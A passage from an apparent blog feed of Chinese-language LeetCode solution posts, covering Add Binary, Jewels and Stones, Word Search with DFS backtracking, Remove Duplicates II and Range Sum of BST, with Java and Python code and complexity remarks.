<h2 id="先-Append-后-Reverse"><a href="#先-Append-后-Reverse" class="headerlink" title="先 Append 后 Reverse"></a>先 Append 后 Reverse</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addBinary</span><span class="params">(String a, String b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> a.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> b.length() - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        	<span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                num1 = (a.charAt(i) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        	<span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            	num2 = (b.charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> num1 + num2 + carry;</span><br><span class="line">            carry = (sum &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            result.append(sum % <span class="number">2</span>);</span><br><span class="line">        	i--;</span><br><span class="line">        	j--;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">if</span> (carry &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.append(carry);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然，提交后内存和时间基本都是最优状态。</p>
<p><img src="/images/2019-07/lc-67-01.png"></p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-771 Jewels and Stones</title>
    <url>/fundamental/algorithm/lc-771-jewels-and-stones/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>You’re given strings <code>J</code> representing the types of stones that are jewels, and <code>S</code> representing the stones you have.  Each character in <code>S</code> is a type of stone you have.  You want to know how many of the stones you have are also jewels.</p>
<p>The letters in <code>J</code> are guaranteed distinct, and all characters in <code>J</code> and <code>S</code> are letters. Letters are case sensitive, so <code>&quot;a&quot;</code> is considered a different type of stone from <code>&quot;A&quot;</code>.</p>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: J = &quot;aA&quot;, S = &quot;aAAbbbb&quot;</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: J = &quot;z&quot;, S = &quot;ZZ&quot;</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong></p>
<ul>
<li><code>S</code> and <code>J</code> will consist of letters and have length at most 50.</li>
<li>The characters in <code>J</code> are distinct.</li>
</ul>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给定两个字符串 <code>J</code> 和 <code>S</code>， <code>J</code> 代表珠宝类型，<code>S</code> 代表石头类型，在 <code>S</code> 中找出珠宝的个数。其中给定的字符串长度不超过 50，<code>J</code> 中的字符不重复。</p>
<p>最简单的想法是使用 Hash 存储 <code>J</code> 中的字符，然后遍历 <code>S</code> 中的每个字符，如果字符命中 Hash，则珠宝数量加 1。这种做法时间复杂度 O(n)，空间复杂度 O(n)，实现也简单，我看可行。</p>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p>按照上述分析思路，使用 Python 实现如下，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numJewelsInStones</span>(<span class="params">self, J: <span class="built_in">str</span>, S: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(S) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(J) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        jewels = <span class="number">0</span></span><br><span class="line">        char_map = <span class="built_in">dict</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> J:</span><br><span class="line">            char_map[j] = <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">if</span> char_map.get(s):</span><br><span class="line">                jewels += <span class="number">1</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> jewels</span><br></pre></td></tr></table></figure>

<p>提交，也能 bugfree，但是 ac 结果显示内存使用打败 <code>5.33%</code> 的 Python 提交。如果要优化空间复杂度的花，可以使用一个长度为 128 的整型数组保存宝石的类型， Java 实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numJewelsInStones</span><span class="params">(String J, String S)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (J.length() == <span class="number">0</span> || S.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">jewels</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] types = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c: J.toCharArray()) &#123;</span><br><span class="line">            types[c-<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c: S.toCharArray()) &#123;</span><br><span class="line">            jewels += types[c-<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jewels;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交后，时空复杂度都还可以。</p>
<p><img src="/images/2019-07/lc-771-01.png"></p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stringl</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-79 Word Search</title>
    <url>/fundamental/algorithm/lc-79-word-search/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>在给定的 2D 平面 board 中搜索单词 word，可以在垂直相邻和水平相邻方向进行深度搜索，如果找到返回 True，否则返回 False。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">board =</span><br><span class="line">[</span><br><span class="line">  [&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;E&#x27;],</span><br><span class="line">  [&#x27;S&#x27;,&#x27;F&#x27;,&#x27;C&#x27;,&#x27;S&#x27;],</span><br><span class="line">  [&#x27;A&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;E&#x27;]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">Given word = &quot;ABCCED&quot;, return true.</span><br><span class="line">Given word = &quot;SEE&quot;, return true.</span><br><span class="line">Given word = &quot;ABCB&quot;, return false.</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">board =</span><br><span class="line">[</span><br><span class="line">  [&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;E&#x27;],</span><br><span class="line">  [&#x27;S&#x27;,&#x27;F&#x27;,&#x27;A&#x27;,&#x27;S&#x27;],</span><br><span class="line">  [&#x27;A&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;E&#x27;]</span><br><span class="line">]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Case 0: word is an empty string, word = <span class="string">&#x27;&#x27;</span>, <span class="built_in">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Case 1: genaral <span class="keyword">case</span> - word = <span class="string">&quot;ABFE&quot;</span>, <span class="built_in">return</span> <span class="literal">true</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Case 2: take backtracking under advisement, word = <span class="string">&quot;AEFBCAFE&quot;</span>, <span class="built_in">return</span> <span class="literal">true</span>.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Case 3: word = <span class="string">&quot;ADEF&quot;</span>, <span class="built_in">return</span> <span class="literal">false</span></span></span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这是一个经典的 DFS 问题，对于一个坐标 <code>(x, y)</code> 可以往四个方向进行搜索，分别是 <code>(x+1, y)</code>, <code>(x-1, y)</code>, <code>(x, y+1)</code>, <code>(x, y-1)</code>。四个方向只要有一个方向搜索成功即可，搜索成功的条件是搜索深度 <code>d == len(word)-1</code>。而搜素失败的原因有很多：</p>
<ol>
<li>(x, y) 出界；</li>
<li>(x, y) 已经使用过（题目要求每个坐标只能使用一次）；</li>
<li>当前的 (x, y) 对应的值和 word[d] 不相等。</li>
</ol>
<p>根据以上分析，构造 dfs 函数需要的参数有 x, y 和 d，其中 d 表示搜索的深度。此外，还需要一个保存搜索过的坐标的辅助变量，这个变量可以放在全局。考虑搜索失败的情况，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">visited = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">x, y, d</span>):</span><br><span class="line">    <span class="keyword">if</span> out_of_bound(x, y):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (x, y) <span class="keyword">in</span> visited:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> board[x][y] != word[d]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># TODO </span></span><br></pre></td></tr></table></figure>



<p>如果当前坐标 (x, y) 满足条件 <code>board[x][y] == word[d]</code> 且 <code>d == len(word) - 1</code> 则搜索成功，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">visited = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">x, y, d</span>):</span><br><span class="line">    <span class="keyword">if</span> out_of_bound(x, y):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (x, y) <span class="keyword">in</span> visited:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> board[x][y] != word[d]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="built_in">len</span>(word) - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>



<p>否则继续往当前坐标的四个方向深入搜索，同时将当前坐标加入到 visited 中，表示当前坐标已经访问过，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">visited = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">x, y, d</span>):</span><br><span class="line">    <span class="keyword">if</span> out_of_bound(x, y):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (x, y) <span class="keyword">in</span> visited:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> board[x][y] != word[d]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="built_in">len</span>(word) - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># continue dfs</span></span><br><span class="line">    visited.add((x,y))</span><br><span class="line">    dx = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line">    dy = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        new_x = x + dx</span><br><span class="line">        new_y = y + dy</span><br><span class="line">        found = found <span class="keyword">or</span> dfs(new_x, new_y, d+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> found</span><br></pre></td></tr></table></figure>



<p>如上，代码基本结构已经完成，大部分测试已经通过。<strong>但是， 考虑具有回溯情况的 Case 2 ，以上代码会失。这是因为如果坐标 (x,y) 的某个方向深入搜索多个步骤后失败，最终还会回到 (x, y) 上进行下一个方向的尝试，可是在进行下一个方向搜索时，上次的失败搜索并没有释放搜索过的坐标，导致有些坐标在本次搜索不能被访问，最终搜索失败。</strong> 所以，对于当前坐标的搜索，如果四个方向都搜索失败，则需要释放当前的 (x, y)，即 <strong>回溯</strong>。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">visited = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">x, y, d</span>):</span><br><span class="line">    <span class="keyword">if</span> out_of_bound(x, y):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (x, y) <span class="keyword">in</span> visited:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> board[x][y] != word[d]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="built_in">len</span>(word) - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># continue dfs</span></span><br><span class="line">    visited.add((x,y))</span><br><span class="line">    dx = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line">    dy = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        new_x = x + dx</span><br><span class="line">        new_y = y + dy</span><br><span class="line">        found = found <span class="keyword">or</span> dfs(new_x, new_y, d+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        visited.remove((x, y))</span><br><span class="line">    <span class="keyword">return</span> found</span><br></pre></td></tr></table></figure>



<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>根据如上分析，代码实现如下（实现使用 used 数组保存访问过的坐标，和用集合 visited 功能一致）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exist</span>(<span class="params">self, board: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]], word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> board <span class="keyword">or</span> <span class="keyword">not</span> word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        m, n = <span class="built_in">len</span>(board), <span class="built_in">len</span>(board[<span class="number">0</span>])</span><br><span class="line">        used = [[<span class="literal">False</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">x, y, pos</span>):</span><br><span class="line">            <span class="comment"># x, y out of bound</span></span><br><span class="line">            <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt;= m <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt;= n:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># word[pos] not equals to board[x][y]</span></span><br><span class="line">            <span class="keyword">if</span> word[pos] != board[x][y]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># (x, y) already used</span></span><br><span class="line">            <span class="keyword">if</span> used[x][y]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># pos == len(word)-1</span></span><br><span class="line">            <span class="keyword">if</span> pos == <span class="built_in">len</span>(word) - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            used[x][y] = <span class="literal">True</span></span><br><span class="line">            dx = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line">            dy = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            found = <span class="literal">False</span> </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                new_x = x + dx[i]</span><br><span class="line">                new_y = y + dy[i]</span><br><span class="line">                found = found <span class="keyword">or</span> dfs(new_x, new_y, pos+<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># backtrack</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">                used[x][y] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> found</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                <span class="keyword">if</span> dfs(i, j, <span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<p><strong>改进：</strong></p>
<p>如上代码使用额外空间来记录访问过的坐标，以避免重复访问，有个技巧可以使用 O(1) 的空间记录访问过的节点。我们只需要用一个特殊符号如 “#” 将访问过的坐标值替换，勾勒出访问路径，并在当前坐标搜索完成后将原来的值替换回来即可。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exist</span>(<span class="params">self, board: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]], word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> board <span class="keyword">or</span> <span class="keyword">not</span> word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        m, n = <span class="built_in">len</span>(board), <span class="built_in">len</span>(board[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">x, y, pos</span>):</span><br><span class="line">            <span class="comment"># x, y out of bound</span></span><br><span class="line">            <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt;= m <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt;= n:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># word[pos] not equals to board[x][y]</span></span><br><span class="line">            <span class="keyword">if</span> word[pos] != board[x][y]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># pos == len(word)-1</span></span><br><span class="line">            <span class="keyword">if</span> pos == <span class="built_in">len</span>(word) - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            orignal = board[x][y]</span><br><span class="line">            board[x][y] = <span class="string">&quot;#&quot;</span></span><br><span class="line">            dx = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line">            dy = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            found = <span class="literal">False</span> </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                new_x = x + dx[i]</span><br><span class="line">                new_y = y + dy[i]</span><br><span class="line">                found = found <span class="keyword">or</span> dfs(new_x, new_y, pos+<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># backtrack</span></span><br><span class="line">            board[x][y] = orignal</span><br><span class="line">            <span class="keyword">return</span> found</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                <span class="keyword">if</span> dfs(i, j, <span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Backtrack</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 80  Remove Duplicates from Sorted Array II</title>
    <url>/fundamental/algorithm/lc-80-remove-duplicates-from-sorted-array-ii/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>给定一个数组，删除部分元素使得所有元素最多重复两次。</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Given nums = [1,1,1,2,2,3],</span><br><span class="line"></span><br><span class="line">Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3 respectively.</span><br><span class="line"></span><br><span class="line">It doesn&#x27;t matter what you leave beyond the returned length.</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><del>基于 xx 题的思路，两个指针l, r, r 指向当前遍历元素 ，l 指向当前有效元素的末尾。思考：</del></p>
<p><del>- l 和 r 起始位置应该在哪里? ~~~<br>~~- l 和 r 的移动规则？</del></p>
<p><del>首先 l 和 r 起始位置都在第 3 个元素，即  <code>r = l = 3</code>，因为前两个元素一定符合题意，因为最多重两次</del></p>
<p><del>判断 r 指向元素是否重复两次以上，如果否同时向后移动 l 和 r。</del></p>
<p><del>如果是则只移动 r 到下一个不与当前元素重复的元素，然后将 r 指向的元素复制到 l 指向的位置，再移动 r。</del></p>
<p>以上是我的思考，但是逻辑非常复杂，程序实现很困难。所以我放弃了这个思路，然后查阅资料发现此题和第一题近乎一模一样，只不过更新条件变更一下，看如下代码。</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">A</span>):</span><br><span class="line">    new_tail = <span class="number">2</span></span><br><span class="line"> 	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(A)):</span><br><span class="line">        <span class="keyword">if</span> A[i] != A[new_tail - <span class="number">2</span>]:</span><br><span class="line">            A[new_tail] = A[i]</span><br><span class="line">            new_tail += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> new_tail</span><br></pre></td></tr></table></figure>

<p>简直太简单了，发现还是自己太菜了，加强学习吧。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-938 Range Sum of BST</title>
    <url>/fundamental/algorithm/lc-938-range-sum-of-bst/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a href="https://leetcode.com/problems/range-sum-of-bst/">https://leetcode.com/problems/range-sum-of-bst/</a></p>
<p>给定一颗二叉搜索树，返回节点的值在 L 和 R 之间的所有节点（包括 L 和 R）的和，其中二叉搜索树的所有节点的值唯一。r如下案例：</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: root = [10,5,15,3,7,null,18], L = 7, R = 15</span><br><span class="line">Output: 32</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: root = [10,5,15,3,7,13,18,1,null,6], L = 6, R = 10</span><br><span class="line">Output: 23</span><br></pre></td></tr></table></figure>

 <span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>二叉搜索树（Binary Search Tree）是一颗空树或者具有如下性质的二叉树：</p>
<ol>
<li>若任意节点的左子树不空，则左子树所有节点的值均小于他的根节点的值</li>
<li>若任意节点的右子树不空，则右子树所有节点的值均大于他的根节点的值</li>
<li>任意节点的左、右子树也分别是二叉搜索树</li>
<li>没有键值相等的节点</li>
</ol>
<p>根据二叉搜索树的特点，假设  L 小于 R，我们按照如下规则查找 L 和 R：</p>
<ol>
<li><p>若根节点的值大于 R，则 L 和 R 都在左子树中，递归查找左子树</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> root.val &gt; R:</span><br><span class="line">    // recursive</span><br></pre></td></tr></table></figure>
</li>
<li><p>若根节点的值小于 L，则 L 和 R 都在右子树中，递归查找右子树</p>
</li>
<li><p>否则说明根节点在 R 和 L 中间，累加根节点的值，分别往左右两边查找 L 和 R，直到 L 和 R 都被找到，查找的过程中，累加在 R 和 L 中间的节点的值</p>
</li>
</ol>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p>根据如上分析，写出如下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rangeSumBST</span>(<span class="params">self, root: TreeNode, L: <span class="built_in">int</span>, R: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> root.val &gt; R:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.rangeSumBST(root.left, L, R)</span><br><span class="line">        <span class="keyword">if</span> root.val &lt; L:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.rangeSumBST(root.right, L, R)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root.val + <span class="variable language_">self</span>.rangeSumBST(root.left, L, R) + <span class="variable language_">self</span>.rangeSumBST(root.right, L, R)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-898 Add to Array-Form of Integer</title>
    <url>/fundamental/algorithm/lc-989-add-to-array-form-of-integer/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>For a non-negative integer <code>X</code>, the <em>array-form of X</em> is an array of its digits in left to right order.  For example, if <code>X = 1231</code>, then the array form is <code>[1,2,3,1]</code>.</p>
<p>Given the array-form <code>A</code> of a non-negative integer <code>X</code>, return the array-form of the integer <code>X+K</code>.</p>
 <span id="more"></span>

<p><strong>Example 1:</strong></p>
